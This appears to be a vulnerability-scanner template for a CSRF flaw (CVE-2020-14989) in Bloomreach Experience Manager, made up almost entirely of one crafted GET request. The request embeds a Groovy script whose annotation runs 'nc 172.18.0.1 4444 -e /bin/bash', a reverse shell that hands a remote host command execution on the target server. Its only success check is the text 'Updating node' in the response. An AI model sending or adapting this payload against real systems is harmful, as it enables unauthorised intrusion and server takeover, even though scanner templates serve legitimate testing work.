id: CVE-2020-14989

info:
  name: Bloomreach Experience Manager CSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: An issue was discovered in Bloomreach Experience Manager (brXM) 4.1.0 through 14.2.2. It allows CSRF if the attacker uses GET where POST was intended.

http:
  - method: GET
    path:
      - "{{BaseURL}}/cms/?1-1.IBehaviorListener.0-root-tabs-panel~container-cards-6-panel-systemPanel-updater~editor-updater~form-execute~button&iframe&radios%3Aname%3Ainput=new-2&radios%3Adescription%3Atextarea=&radios=radio10&radios%3Apath%3Ainput=%2F&radios%3Aparameters%3Atextarea=&radios%3Abatch-size%3Ainput=10&radios%3Athrottle%3Ainput=1000&radios%3Alog-level%3Achoice=DEBUG&script-editor=package+org.hippoecm.frontend.plugins.cms.admin.updater%0D%0A%0D%0Aimport+org.onehippo.repository.update.BaseNodeUpdateVisitor%0D%0Aimport+javax.jcr.Node%0D%0Aimport+javax.jcr.RepositoryException%0D%0Aimport+javax.jcr.Session%0D%0A%0D%0A%40groovy.transform.ASTTest(value%3D%7Bassert+java.lang.Runtime.getRuntime().exec(%22nc+172.18.0.1+4444+-e+%2Fbin%2Fbash%22)%7D)%0D%0A%0D%0Aclass+UpdaterTemplate+extends+BaseNodeUpdateVisitor+%7B%0D%0A%0D%0A++boolean+logSkippedNodePaths()+%7B%0D%0A++++return+false+%2F%2F+don\'t+log+skipped+node+paths%0D%0A++%7D%0D%0A%0D%0A++boolean+skipCheckoutNodes()+%7B%0D%0A++++return+false+%2F%2F+return+true+for+readonly+visitors+and%2For+updates+unrelated+to+versioned+content%0D%0A++%7D%0D%0A%0D%0A++Node+firstNode(final+Session+session)+throws+RepositoryException+%7B%0D%0A++++return+null+%2F%2F+implement+when+using+custom+node+selection%2Fnavigation%0D%0A++%7D%0D%0A%0D%0A++Node+nextNode()+throws+RepositoryException+%7B%0D%0A++++return+null+%2F%2F+implement+when+using+custom+node+selection%2Fnavigation%0D%0A++%7D%0D%0A%0D%0A++boolean+doUpdate(Node+node)+%7B%0D%0A++++log.debug+%22Updating+node+%24%7Bnode.path%7D%22%0D%0A++++return+false%0D%0A++%7D%0D%0A%0D%0A++boolean+undoUpdate(Node+node)+%7B%0D%0A++++throw+new+UnsupportedOperationException(\'Updater+does+not+implement+undoUpdate+method\')%0D%0A++%7D%0D%0A%0D%0A%7D%0D%0A&execute-button=1"
    matchers:
      - type: word
        words:
          - "Updating node"
        part: body